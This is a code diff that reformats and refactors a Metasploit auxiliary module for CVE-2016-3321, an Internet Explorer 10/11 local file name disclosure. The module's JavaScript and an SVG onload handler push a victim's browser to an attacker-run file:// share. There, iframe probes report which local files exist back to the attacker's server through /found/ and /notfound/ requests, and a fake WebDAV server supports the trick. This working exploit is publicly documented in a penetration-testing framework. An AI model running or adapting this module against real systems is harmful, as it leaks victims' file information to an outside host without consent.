@@ -6,49 +6,55 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability',
-      'Description'    => %q{
-        It was found that Internet Explorer allows the disclosure of local file names.
-        This issue exists due to the fact that Internet Explorer behaves different for
-        file:// URLs pointing to existing and non-existent files. When used in
-        combination with HTML5 sandbox iframes it is possible to use this behavior to
-        find out if a local file exists. This technique only works on Internet Explorer
-        10 & 11 since these support the HTML5 sandbox. Also it is not possible to do
-        this from a regular website as file:// URLs are blocked all together. The attack
-        must be performed locally (works with Internet zone Mark of the Web) or from a
-        share.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'Yorick Koster',
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability',
+        'Description' => %q{
+          It was found that Internet Explorer allows the disclosure of local file names.
+          This issue exists due to the fact that Internet Explorer behaves different for
+          file:// URLs pointing to existing and non-existent files. When used in
+          combination with HTML5 sandbox iframes it is possible to use this behavior to
+          find out if a local file exists. This technique only works on Internet Explorer
+          10 & 11 since these support the HTML5 sandbox. Also it is not possible to do
+          this from a regular website as file:// URLs are blocked all together. The attack
+          must be performed locally (works with Internet zone Mark of the Web) or from a
+          share.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'Yorick Koster',
+        'References' => [
           ['CVE', '2016-3321'],
           ['MSB', 'MS16-095'],
           ['URL', 'https://securify.nl/advisory/SFY20160301/internet_explorer_iframe_sandbox_local_file_name_disclosure_vulnerability.html'],
         ],
-      'Platform'       => 'win',
-      'DisclosureDate' => '2016-08-09'
-    ))
+        'Platform' => 'win',
+        'DisclosureDate' => '2016-08-09',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('SHARENAME', [ true, "The name of the top-level share.", "falcon" ]),
         OptString.new('PATHS', [ true, "The list of files to check (comma separated).", "Testing/Not/Found/Check.txt, Windows/System32/calc.exe, Program Files (x86)/Mozilla Firefox/firefox.exe, Program Files/VMware/VMware Tools/TPAutoConnSvc.exe" ]),
-      ])
+      ]
+    )
 
     # no SSL
     deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT', 'URIPATH')
   end
 
   def js
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     %Q|function report() {
   if(window.location.protocol != 'file:') {
     try {
-      window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
+      window.location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html';
     } catch (e) { }
     return;
   }
@@ -57,10 +63,10 @@ class MetasploitModule < Msf::Auxiliary
   for(var i = 0; i < frames.length; i++) {
   try {
       if(frames[i].name == 'notfound') {
-        frames[i].src = 'http://#{my_host}/notfound/?f=' + frames[i].src;
+        frames[i].src = 'http://#{srvhost_addr}/notfound/?f=' + frames[i].src;
       }
       else {
-        frames[i].src = 'http://#{my_host}/found/?f=' + frames[i].src;
+        frames[i].src = 'http://#{srvhost_addr}/found/?f=' + frames[i].src;
       }
     } catch(e) { }
   }
@@ -90,10 +96,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def svg
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     %Q|<!-- saved from url=(0014)about:internet -->
-<svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
+<svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
   end
 
   def is_target_suitable?(user_agent)
@@ -110,8 +114,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    my_host  = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     case request.method
     when 'OPTIONS'
       process_options(cli, request)
@@ -130,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
       case request.uri
       when /^\/found\/\?f=/
         f = URI.decode_www_form(request.uri.split("/found/?").last).assoc('f').last
-        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)
+        report_note(host: cli.peerhost, type: 'ie.filenames', data: { :filenames => f })
         print_good("Found file " + f)
         send_response(cli, '')
       when /^\/notfound\/\?f=/
@@ -143,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
 <head>
 <script type="text/javascript">
   try {
-    window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
+    window.location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html';
   } catch (e) {
     blob = new Blob([atob('#{Rex::Text.encode_base64(svg)}')]);
     window.navigator.msSaveOrOpenBlob(blob, 'image.svg');
@@ -176,15 +178,15 @@ class MetasploitModule < Msf::Auxiliary
     print_status("OPTIONS #{request.uri}")
     headers = {
       'MS-Author-Via' => 'DAV',
-      'DASL'          => '<DAV:sql>',
-      'DAV'           => '1, 2',
-      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
-      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
+      'DASL' => '<DAV:sql>',
+      'DAV' => '1, 2',
+      'Allow' => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
+      'Public' => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
       'Cache-Control' => 'private'
     }
 
     resp = create_response(207, "Multi-Status")
-    headers.each_pair {|k,v| resp[k] = v }
+    headers.each_pair { |k, v| resp[k] = v }
     resp.body = ""
     resp['Content-Type'] = 'text/xml'
     cli.send_response(resp)
@@ -196,13 +198,8 @@ class MetasploitModule < Msf::Auxiliary
   def process_propfind(cli, request)
     path = request.uri
     print_status("PROPFIND #{path}")
-    body = ''
-
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-    my_uri = "http://#{my_host}/"
 
     if path !~ /\/$/
-
       if path.index(".")
         print_status "PROPFIND => 207 File (#{path})"
         body = %Q|<?xml version="1.0" encoding="utf-8"?>
@@ -213,7 +210,7 @@ class MetasploitModule < Msf::Auxiliary
 <D:prop>
 <lp1:resourcetype/>
 <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
-<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
+<lp1:getcontentlength>#{rand(0x100000) + 128000}</lp1:getcontentlength>
 <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
 <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
 <lp2:executable>T</lp2:executable>
@@ -306,7 +303,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def generate_shares(path)
     share_name = datastore['SHARENAME']
-%Q|
+    %Q|
 <D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
 <D:href>#{path}#{share_name}/</D:href>
 <D:propstat>
@@ -345,7 +342,7 @@ class MetasploitModule < Msf::Auxiliary
 <D:prop>
 <lp1:resourcetype/>
 <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
-<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
+<lp1:getcontentlength>#{rand(0x10000) + 120}</lp1:getcontentlength>
 <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
 <lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
 <lp2:executable>T</lp2:executable>
@@ -368,11 +365,11 @@ class MetasploitModule < Msf::Auxiliary
 |
   end
 
-  def gen_timestamp(ttype=nil)
+  def gen_timestamp(ttype = nil)
     ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
   end
 
-  def gen_datestamp(ttype=nil)
+  def gen_datestamp(ttype = nil)
     ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
   end
 
